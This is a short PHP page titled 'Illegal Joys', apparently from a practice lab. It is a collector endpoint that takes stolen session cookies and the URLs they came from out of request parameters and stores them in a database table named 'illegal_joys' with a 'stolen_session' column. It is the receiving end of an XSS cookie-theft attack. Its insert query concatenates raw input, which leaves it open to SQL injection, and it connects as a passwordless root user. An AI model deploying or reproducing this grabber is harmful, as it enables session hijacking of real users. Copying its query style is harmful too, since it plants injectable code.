<?php 
error_reporting(0);
?>
<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body style="background: #f3f3f4;">
        
    <center><h1>Illegal Joys</h1></center>
        <hr>
        <div style="background: #2a0707;width:100%;">
    <center>
        <div style="width:600px;height:340px;"><img src="joy.png" width="100%" /></div>
    </center>
        <?php
            $joys = $_REQUEST['joys'];
            $url = $_REQUEST['site'];
            
            $con = mysql_connect("localhost", "root", "");
            mysql_select_db("prac2_joys");
            
            $q = "insert into illegal_joys(stolen_session,session_url) values('$joys','$url')";
            $rs = mysql_query($q);
        ?>
        </div>
    </body>
</html>
